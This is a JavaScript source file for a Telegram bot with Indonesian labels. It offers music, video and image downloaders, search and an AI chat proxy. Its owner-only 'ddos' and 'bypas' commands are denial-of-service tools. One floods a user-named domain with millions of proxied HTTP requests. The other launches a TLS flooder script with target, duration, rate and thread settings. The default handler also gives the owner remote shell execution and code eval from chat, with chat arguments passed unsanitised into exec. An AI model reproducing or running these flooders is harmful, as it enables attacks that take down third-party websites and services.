require('../config')
const { Telegraf,
        Context
        } = require('telegraf')
const {message,
       editedMessage,
       channelPost,
       editedChannelPost,
       callbackQuery
       } = require("telegraf/filters");
const yts = require('yt-search');
const chalk = require('chalk')
const fs = require('fs')
const fetch = require('node-fetch')
const os = require('os')
const speed = require('performance-now')
const util = require('util')
const path = require('path')
const moment = require('moment-timezone')
const { exec, 
        spawn, 
        execSync
        } = require('child_process')
const axios = require('axios');

const { UploadFileUgu, 
        webp2mp4File, 
        floNime 
        } = require('./lib/uploader')
const { TelegraPh } = require('./lib/uploader')
const {toFirstCase,
        isNumber,
        formatp,
        parseMention, 
        resize, 
        getRandom,
        generateProfilePicture, 
        getCase, 
        runtime, 
        FileSize, 
        h2k, 
        makeid, 
        kyun, 
        randomNomor, 
        jsonformat, 
        isUrl,
        fetchJson, 
        sleep,
        getBuffer
        } = require("./lib/myfunc2");
       
const { 
       animeSearch
        } = require('@kaviaann/scraper')
const { 
pinterest 
} = require("./lib/pinterest")

let d = new Date
let gmt = new Date(0).getTime() - new Date('1 Januari 2023').getTime()
const weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString('id', { weekday: 'long' })
const calender = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const timestampp = speed();
const latensi = speed() - timestampp
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const salam = 'Selamat '+dt.charAt(0).toUpperCase() + dt.slice(1)
//================================
const {
    simple
} = require('./lib/myfunc1')
//=================================
//MENU ACTION
const keyboardmenu =  [
      [{text: 'Next', callback_data:'next'}],      
      [{text: 'Join Group', url:'https://t.me/netcomCatozolala'}, {text: 'Owner', url: 't.me/catozolala'}]
]
let menuh2 = `Welcome To Bot Telegeram\n━┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄━`;
const keyboardmenu1 = [[{ text: 'Allmenu' }, { text: 'tools' }]]
//=====================
//ALLMENU ACTION
const apin1 = `Welcome To Allmenu\nKlick With Keyboard...`
const keyboardallmenu =  [
        [{ text: 'Menusearch 🔎' }],
        [{ text: 'Menuai 🤖' }],
        [{ text: 'Menuowner 👤' }],
        [{ text: 'Menudownload 📥' }]
      ]
//==========================
//MANU AI ACTION
const keyboardai = [
[{ text: 'ai' }, { text: 'chatgpt' }]
]
const menuai1 = `Welcome To Menu Ai\nSilahkan Klick Keyboard Anda...`
//========================
//MENU OWNER
const keyboardowner = [
[{ text: 'restart' }, { text: 'ddos' }],
[{ text: 'bypas' }]
]
const menuowner1 = `Welcome To Menu Owner\nSilahkan Klick Keyboard Anda...`
//========================
//MENU DOWNLOAD
const keyboarddownload = [
[{ text: 'play' }, { text: 'yts' }],
[{ text: 'pinterest' }, { text: 'instagram'}],
[{ text: 'facebook' }]
]
const menudownload1 = `Welcome To Menu Download\nSilahkan Klick Keyboard Anda...`
//========================
async function delay(ms){
return new Promise(res => {
setTimeout(()=>res(),ms)
})
}
//=====================
//UNTUK TOKEN BOT BUAT RUN 
const bot = new Telegraf(TOKEN)
//=====================
    bot.on('message', async (client) => {
        require("./anujs.js")(client, bot)

    })
//====================
/*   
    •Catozolala
    •Bawah Untuk Responya
*/
//NEXT ACTION
bot.action('next', (client) => {
const ada = `Halo Saya Adalah Bot ${wm}\nSIlahkan Klick Button Di Bawah Ini\n
　╭╮╱▔▔▔▔▔╲╭╮ ┃HO
⠀⠀╰╱╭▅╮⠀╭▅╮╲╯┃LA!
⠀⠀⠀▏╰╱▔▇▔╲╯▕⠀┻━━
╱╲⠀▏⠀▏⠀┃⠀▕⠀▕⠀╱╲⠀
▏⠀╲╲⠀╲╰┻╯╱⠀╱╱⠀▕⠀
╲⠀⠀╲╲⠀▔▔▔⠀╱╱⠀⠀╱⠀
⠀╲⠀⠀▔▕╲▂╱▏▔⠀⠀╱⠀⠀
⠀⠀╲⠀⠀▕╱▔╲▏⠀⠀╱ \n━┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄━`
client.editMessageText(ada, {reply_markup: {
inline_keyboard:[
[{text: 'Back', callback_data: 'startdata'}],
[{text: 'Allmenu', callback_data:'allmenudata'}], 
[{text: 'Join Group', url:'https://t.me/netcomCatozolala'}, {text: 'Owner', url: 't.me/catozolala'}]
]}
})
})
//======================
bot.action('startdata', (client) => {
client.editMessageText(menuh2+'\n'+`Welcome To Bot Kak\nKami Adalah Bot ${wm} Kami Siap Melayani Anda`, {reply_markup: { inline_keyboard:keyboardmenu}
})
})
//=====================
bot.action('allmenudata', (client) => {
client.deleteMessage().catch(() => {});
client.sendMessage(apin1, {
    reply_markup: {
      keyboard:keyboardallmenu,
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
})
//=========================================
    bot.launch({
        dropPendingUpdates: true
    })

    bot.telegram.getMe().then((getme) => {
        console.table({
            "Creator": "BioXservice",
            "Bot Name": getme.first_name,
            "Username": "@" + getme.username,
            "ID": getme.id,
            "Link": `https://t.me/${getme.username}`,
            "Author": "https://t.me/@BioXservice"
          })
    })
module.exports = client = async (client, bot) => {
    //console.log(client)
    try {
        const body = client.message.text || client.message.caption || ''
        const budy = (typeof client.message.text == 'string' ? client.message.text : '')
        const {
            isUrl
        } = simple
        const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '' // di string '' kasih '.' sebelumnya, guna untuk hanya owner yang tidak mengenakan prefix dan pengguna lain menggunakan prefix titik
        const isCmd = body.startsWith(prefix)
        const isCreator = OWNER[0].replace("https://t.me/", '') == client.update.message.from.username
        const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1)
        const text = q = args.join(" ")
        const user = simple.getUserName(client.message.from)
        const pushname = user.full_name;
        const user_id = client.message.from.id + " "
        const username = client.message.from.username ? client.message.from.username : "catozolala";
        const from = client.message.chat.id

        const isGroup = client.chat.type.includes('group')
        const groupName = isGroup ? client.chat.title : ''

        const isImage = client.message.hasOwnProperty('photo')
        const isVideo = client.message.hasOwnProperty('video')
        const isAudio = client.message.hasOwnProperty('audio')
        const isSticker = client.message.hasOwnProperty('sticker')
        const isContact = client.message.hasOwnProperty('contact')
        const isLocation = client.message.hasOwnProperty('location')
        const isDocument = client.message.hasOwnProperty('document')
        const isAnimation = client.message.hasOwnProperty('animation')
        const isMedia = isImage || isVideo || isAudio || isSticker || isContact || isLocation || isDocument || isAnimation
        const quotedMessage = client.message.reply_to_message || {}
        const isQuotedImage = quotedMessage.hasOwnProperty('photo')
        const isQuotedVideo = quotedMessage.hasOwnProperty('video')
        const isQuotedAudio = quotedMessage.hasOwnProperty('audio')
        const isQuotedSticker = quotedMessage.hasOwnProperty('sticker')
        const isQuotedContact = quotedMessage.hasOwnProperty('contact')
        const isQuotedLocation = quotedMessage.hasOwnProperty('location')
        const isQuotedDocument = quotedMessage.hasOwnProperty('document')
        const isQuotedAnimation = quotedMessage.hasOwnProperty('animation')
        const isQuoted = client.message.hasOwnProperty('reply_to_message')
        const timestampi = speed();
        const latensii = speed() - timestampi

        const reply = async (text) => {
            for (var x of simple.range(0, text.length, 4096)) { 
                return await client.replyWithMarkdown(text.substr(x, 4096), {
                    disable_web_page_preview: true
                })
            }
        }
        const getStyle = (style_, style, style2) => {
            listt = `${lang.getStyle(style, style2)}`
            for (var i = 0; i < 300; i++) {
                listt += '» `' + style_[i] + '`\n'
            }
            reply(listt)
        }

        //get type message 
        var typeMessage = body.substr(0, 50).replace(/\n/g, '')
        if (isImage) typeMessage = 'Image'
        else if (isVideo) typeMessage = 'Video'
        else if (isAudio) typeMessage = 'Audio'
        else if (isSticker) typeMessage = 'Sticker'
        else if (isContact) typeMessage = 'Contact'
        else if (isLocation) typeMessage = 'Location'
        else if (isDocument) typeMessage = 'Document'
        else if (isAnimation) typeMessage = 'Animation'
      
async function delay(ms){
return new Promise(res => {
setTimeout(()=>res(),ms)
})
}

if (message) {
const b = body
console.log(`${chalk.blue("MESSAGE")}: ${chalk.green(b)}`)
}

if (global.autokirim && isGroup) {
let au = await fetchJson(`https://api.miftahganzz.my.id/api/ai/simisimi?q=${encodeURI(budy)}&apikey=officialdittaz`)
if(!au.respon) return reply('Aku tidak tahu apa yang kamu ucapkan')
reply(au.respon)
}


/*bot.on('callback_query', (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  */
 
switch (command) {
/////////////////////////////////
case 'menuowner': {
client.deleteMessage().catch(() => {});
client.sendMessage(menuowner1, {
    reply_markup: {
      keyboard:keyboardowner,
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
////////////////////////////////////
case 'autosimi':
    if(!isCreator) return reply('_[!] Warning Feature_')
if (args[0] == 'enable'){
if (global.autokirim) return reply('_☘️di aktifkan sebelumnya!_')
global.autokirim = true
reply('_☘️Fitur autosimi telah di aktifkan_')
} else if (args[0] == 'desable'){
if (!global.autokirim) return reply('_❌sudah mati sebelumnya!_')
global.autokirim = false
reply('_❌Fitur autosimi telah di matikan_')
} else reply('_🍁.autosimi enable/desable_')
break
//////////////////////////////////
case 'menuai': {
client.deleteMessage().catch(() => {});
client.sendMessage(menuai1, {
    reply_markup: {
      keyboard:keyboardai,
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
/////////////////////////////////////////
case 'menudownload': {
client.deleteMessage().catch(() => {});
client.sendMessage(menudownload1, {
    reply_markup: {
      keyboard:keyboarddownload,
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
/////////////////////////////////////////
case "ddos":
  {
    if(!isCreator) return reply('_[!] Warning Feature_')
      if (!text) return reply('_send domain target_')
        const SocksProxyAgent = require('socks-proxy-agent');
          const HttpsProxyAgent = require('https-proxy-agent');
            const userIP = 'myserver2.junn4.my.id'; // masukkan link panel tanpa https://
              const targetUrl = text; // Ganti dengan URL tujuan yang sesuai
                const proxyListFile = 'console/lib/media/hackingTools/proxy.txt'; // Nama file yang berisi daftar proxy
                  const totalRequests = 5000000;
                     const delay = 100;
                  function readProxyList() {
                try {
              const data = fs.readFileSync(proxyListFile, 'utf8');
            const lines = data.trim().split('\n');
          return lines.map(line => line.trim());
        } catch (error) {
      console.error(`Gagal membaca daftar proxy: ${error}`);
    return [];
  }
}

  function sendRequest(target, agent, userIP) {
    if (allowedIPs.includes(userIP)) {
      axios.get(target, { httpAgent: agent }) // Menggunakan httpAgent untuk proxy SOCKS
         .then((response) => {
       
        // Lakukan sesuatu dengan respons
        }
          )
             .catch((error) => {
        
        // Tangani kesalahan
                }
                    );
                } 
             else 
          {
        console.error(`IP Mu Tidak Terdaftar`);
      }
    }
  function sendRequests() {
     const proxyList = readProxyList();
       let currentIndex = 0;
         function sendRequestUsingNextProxy() {
             if (currentIndex < proxyList.length) {
                const proxyUrl = proxyList[currentIndex];
                    let agent;
                        if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
                             agent = new SocksProxyAgent(proxyUrl);
                                 } 
                                   else if (proxyUrl.startsWith('https')) 
                                 {
                             agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) }); // Menggunakan HttpsProxyAgent dengan protocol 'http'
                        }

                    sendRequest(targetUrl, agent, userIP);
                 currentIndex++;
                setTimeout(sendRequestUsingNextProxy, 0);
             } 
         else 
       {
     setTimeout(sendRequests, delay);
  }
    }
       sendRequestUsingNextProxy();
            }
                 const allowedIPs = ['myserver2.junn4.my.id'];
// Mendapatkan alamat IP pengguna
            sendRequests();
      reply('_menyerang_...')
    }
  break
  
case 'infogempa': {
let scrapy = require("node-scrapy")
const model = ['tr:nth-child(1) td']
fetch('https://www.bmkg.go.id/gempabumi/gempabumi-terkini.bmkg').then((res) => res.text()).then((body) => {
let result = scrapy.extract(body, model)
let waktu = result[1] || "Tidak ada data"
let lintang = result[2] || "Tidak ada data"
let bujur = result[3] || "Tidak ada data";
let magnitudo = result[4] || "Tidak ada data"
let kedalaman = result[5] || "Tidak ada data"
let lokasi = result[6] || "Tidak ada data"
const teks = `informasi gempa terbaru:\nWaktu: *${waktu}*\nBujur: *${bujur}*\nLintang: *${lintang}*\nMagnitudo: *${magnitudo}*\nKedalaman: *${kedalaman}*\nLokasi: *${lokasi}*\nInfo: *https://www.bmkg.go.id/gempabumi/gempabumi-terkini.bmkg*`.trim()
reply("```"+teks+"```")
})
}
break
/////////////////////////////////////////////////
  case 'bypas':{
    if(!isCreator) return reply('[!] Developer Feature')
     if (!q.includes(' ')) return reply('*Example* example.com [time] [rps] [threads]')
     mm = args.join(' ')
     m1 = mm.split(" ")[0];
     m2 = mm.split(" ")[1]; 
     m3 = mm.split(" ")[2];
     m4 = mm.split(" ")[3];
     const url = m1;
     const time = m2;
     const rps = m3;
     const threads = m4;
     const proxyListFile = 'console/lib/media/hackingTools/proxy.txt'
     exec(`node console/lib/media/hackingTools/tls-arz.js ${url} ${time} ${rps} ${threads} ${proxyListFile}`, (error, stdout, stderr) => {
     if (error) {
          reply(`eror: ${Error}`);
          return;
        }
        if (stderr) {
          reply(`${stderr}`);
          return;
        }
        reply(`${stdout}`);
      });
      console.log(`${proxyListFile}`)
      reply(`*Attack Server*\n*• Method* : main.py\n*• Target* : ${m1}\n*• Time* : ${m2}\n*• Rps* : ${m3}\n*• Thread* : ${m4}\n*• Proxy* : proxy.txt\n\n`)
    }
  break
//===========================================================//
            //OWENER LOCATED 
  case 'restart':
    if (!isCreator) return reply('[!] Developer Feature')
        reply('[!] Restart To Server')
        delay(3000)
    process.exit()
  break
  
  //===========================================================//
  
//===========================================================//
            // INFORMATION LOCATED 
  case 'owner':
  case 'creator': {
    client.deleteMessage().catch(() => {});
        reply(`My Development [${OWNER_NAME}](${OWNER[0]})`)
    }
  break
case 'speed': case 'ping':{
        const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ 

_Info Server_
⬡-▸ RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
⬡-▸ CPU: ${cpus[0].model.trim()} 
⬡-▸ UPTIME: ${runtime(process.uptime())}

_NodeJS Memory Usaage_
${Object.keys(used)
  .map(
    (key, _, arr) =>
      `${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
        used[key]
      )}`
  )
  .join("\n")}
`.trim();
reply(respon)
      }
    break
//===========================================================//
            // AI LOCATED 
  case 'openai':
  case 'chatgpt': 
  case 'ai':{
        if (!text) return reply('Query..?!')
            let prompt = `ubah gaya bicaramu agar lebih karakteristik dan nama mu adalah catozola bot yang di ciptakan hacker profesional bernama biongWave ekspresikan diri mu dengan emot`
                let anu = await fetchJson(`https://api.junn4.my.id/ai/chatGptV2?model=${prompt}&text=${text}`)
            const hasil = anu.result
     reply(hasil)
    }
  break
  

//===========================================================//
            // DOWNLOAD LOCATED 
  case 'play':
    client.deleteMessage().catch(() => {});
        if (!text) return reply('harap masukan querry/judul')
           reply('searching')
              let search1 = await yts(`${text}`)
                let data2 = await search1.all.filter((v) => v.type == 'video')
                    try {
                        var res = data2[0]
                            } catch {
                                var res = data2[1]
                            }
                        let ply = search1.videos[0].url
                    const ytdl = require('ytdl-core')
                let nana = ytdl(ply, { filter: 'audioonly' })
              let todd2 = await getBuffer(search1.all[0].image)
           await client.replyWithPhoto({
        url: res?.thumbnail
    }, {
  caption: `• Title : ${search1.all[0].title}\n• Views : ${search1.all[0].views}`
     })
        await client.replyWithAudio({
            source: nana,
            filename: `${search1.all[0].title}`,
        }
     )
  break
  case 'facebook':
  case 'fb':{
     if (!text) return reply('[!] link..!')
        client.deleteMessage().catch(() => {});
            reply('[!] Wait Result...')
                let anu = await fetchJson(`http://15.235.142.199/api/download/facebook?url=${text}&apikey=alpin`)
            const tiktoknya = anu.result.Medium
        await client.replyWithVideo({
    url: anu.result.url,
  }, {
     caption: `DONE`
        }
        )
     }
  break
  case 'ig': 
  case 'instagram':{
    if (!text) return reply('[!] link...!')
        client.deleteMessage().catch(() => {});
            reply('[!] Wait Result...')
                let anu = await fetchJson(`https://api.arifzyn.tech/download/instagram?url=${q}&apikey=alvin`)
                    await client.replyWithVideo({
                url: anu.result.media,
                   }, {
                caption: `DONE`
            }
        )
    }
  break
  case 'pinterest':
  case 'pin':
    client.deleteMessage().catch(() => {});
        if (args.length < 2) return reply(` •Exemple ${command} <query> -jumlah`)
            reply('Tunggu sebentar...')
                var jumlah;
                    if (q.includes('-')) jumlah = q.split('-')[1]
                        pinterest(q.replace('-'+jumlah, '')).then(async(data) => {
                            if (q.includes('-')) {
                                if (data.result.length < jumlah) {
                            jumlah = data.result.length
                        reply(`Result ${data.result.length}`)
                    }
                for (let i = 0; i < jumlah; i++) {
            client.replyWithPhoto({
        url: data.result[i]
    }, {
  caption: `${i+1}/${jumlah}\nResult : ${text}`,
  reply_markup: {
inline_keyboard:[
[{text: 'Url', url:`${data.result[i]}`}]
]}
     })
        }

            } else { 
                client.replyWithPhoto({
                    url: global.anime
                       }, {
                      caption: 'DONE'
                    }
                )
            }
        }
     )
  break
  
  case 'pixiv':
if (!text) return reply(`• Exemple ${command} <query>`)
            reply('Tunggu sebentar...')
let search = await fetchJson(
      `https://api.obfs.dev/api/pixiv/search?word=${text} ai illustration&search_ai_type=false&mode=partial_match_for_tags&order=popular_desc`,
    );
function pickRandomF(list) {
return list[Math.floor(list.length * Math.random())]
}

let random = await pickRandomF(search.illusts)
let cappixiv = `*• Result : ${text}*
*• Author :* ${random.user.name}
*• Tags :* ${random.tags.map((a) => a.name).join(" ,")}`

client.replyWithPhoto(
        "https://pixiv.re/" + random.id + ".png", {
            caption: cappixiv,
    reply_markup: {
      keyboard: [
        [{ text: 'pixiv ' + text }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        }).catch((err) => reply('Maaf erjadi Kesalahan!'))
          client.deleteMessage().catch(() => {});
  break 

case 'anime':  {
client.deleteMessage().catch(() => {});
if (!text) return reply(`• Example ${prefix + command} Date A Live`)
reply(`Sedang Mencari ${text}...\nRequest By : @${user.username}`)
animeSearch(text, datas => {
const res = datas.map((v, i) => {
let _ani = `${i+1}. Judul : ${v.title}\nScore ( Rating ) : ${v.score}\nType : ${v.type}\nSeason : ${v.season}\nGenre : ${v.genre}\nSynops : ${v.synops}`
client.replyWithPhoto(v.thumb, { caption: _ani,
reply_markup: {
inline_keyboard: [
[
{text: 'url', url: `${v.link}`},
]
]
}
})
})
})
}
break
  
  case 'yts': 
  case 'ytsearch': {
     if (!text) throw `Example : ${prefix + command} somebody pleasure`
        let search = await yts(text)
            let teks = '*YouTube Search*\n\nResult From '+text+'\n\n'
                let no = 1
                    for (let i of search.all) {
                        teks = `• No Urutan : ${no++}\n• Type : ${i.type}\n• Video ID : ${i.videoId}\n• Title : ${i.title}\n• Views : ${i.views}\n• Duration : ${i.timestamp}\n• Upload At : ${i.ago}\n• Url : ${i.url}`
                            }
                              client.deleteMessage().catch(() => {});
                            client.replyWithPhoto(
                        search.all[0].thumbnail, {
                    caption: teks,
                reply_markup: {
            keyboard: [
        [{ text: 'audio' }, { text: 'video' }]
     ],
  one_time_keyboard: true,
     resize_keyboard: true
        }
          }
        )
    }
 break
//===========================================================//

case 'tes':
/*client.deleteMessage().catch(() => {});
reply('hai',
reply_markup: {
      keyboard: [
        [{ text: 'next' }],
        [{ text: 'owner' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    },
)*/
break
//===========================================================//
case 'information':
client.deleteMessage().catch(() => {});
{
    client.replyWithPhoto(   
        global.anime,
        {
            caption: `this is the bot number of the WhatsApp version of this bot`,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'YouTube', url: 'https://www.youtube.com/@callmevinz'},
                        {text: 'WhatsApp', url: `https://wa.me/${global.pairingNumber}`},
                    ],
                    [
                        {text: 'Join Grup', url: 'http://t.me/ALStoreMe'}
                    ],
                    [
                        {text: 'Start Bot', callback_data: 'menu'}
                    ]
                ]
            }
        }
    );
}
break
case 'next':
    client.deleteMessage().catch(() => {});
   let memek = client.replyWithPhoto(
        global.anime, {
            caption: `Hallo ${pushname} untuk cara penggunaan, silahkan pilih tombol dibawah keyboard anda`,
    reply_markup: { 
      keyboard: [
        [{ text: 'play' }, { text: 'ytsearch' }], 
        [{ text: 'openai' }, { text: 'pinterest' }],
        [{ text: 'tools' }, { text: 'allmenu' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
break
case 'tools':
    client.deleteMessage().catch(() => {});
    client.replyWithPhoto(
        global.anime, {
            caption: `Hi 👋 ${pushname} untuk cara penggunaan, silahkan pilih tombol dibawah keyboard anda`,
    reply_markup: {
      keyboard: [
        [{ text: 'bypas' }, { text: 'ddos' }], 
        [{ text: 'back!' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })

break
case 'menu': case 'back': case 'start':
client.deleteMessage().catch(() => {});
let menuh1 = `Welcome To Bot @${simple.getUserName(client.message.from).username}\nKami Adalah Bot ${wm} Kami Siap Melayani Anda`;
client.sendMessage(menuh2+'\n'+menuh1+'\n━┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄━', {reply_markup: { inline_keyboard:keyboardmenu}
})
break

case 'allmenu':
client.deleteMessage().catch(() => {});
client.sendMessage(apin1, {
    reply_markup: {
      keyboard:keyboardallmenu,
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
break
case 'menusearch': {
client.deleteMessage().catch(() => {});
client.sendMessage(`Hai User @${user.username} Selamat Datang di ${command}\nSilahkan Klick Keyboard Anda`, {
reply_markup: {
keyboard: [
[{ text: 'Play' }, { text: 'YtSearch' }, { text: 'Anime' } ],
[{ text: 'Pinterest' }, {text: 'Pixiv' }],
],
one_time_keyboard: true,
resize_keyboard: true 
}
})
}
break
//===========================================================//

    
       default:                  
            if (body.startsWith('>')) {
                    if(!isCreator) return;
                        try {
                    let evaled = await eval(body.slice(2))
                       if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await reply(evaled)
                    } catch (err) {
               reply(String(err))
            }
       }
       
            if (body.startsWith('$')){
                client.deleteMessage().catch(() => {});
                    if(!isCreator) return;
                        qur = body.slice(2)
                          exec(qur, (err, stdout) => {
                            if (err) return reply(`${err}`)
                          if (stdout) {
                        reply(stdout)
                    }
                }
            )
       }
       
            if (body.startsWith('<')) {
                client.deleteMessage().catch(() => {});
                    if(!isCreator) return;
                        try {
                            return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
                        } catch (e) {
                }
            }
            
       }
       
            } catch (e) {
                client.reply(util.format(e))
                   console.log('[ ERROR ] ' + e)
                }
            }
            
            
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`" Update ${__filename} "`)
delete require.cache[file]
require(file)
})
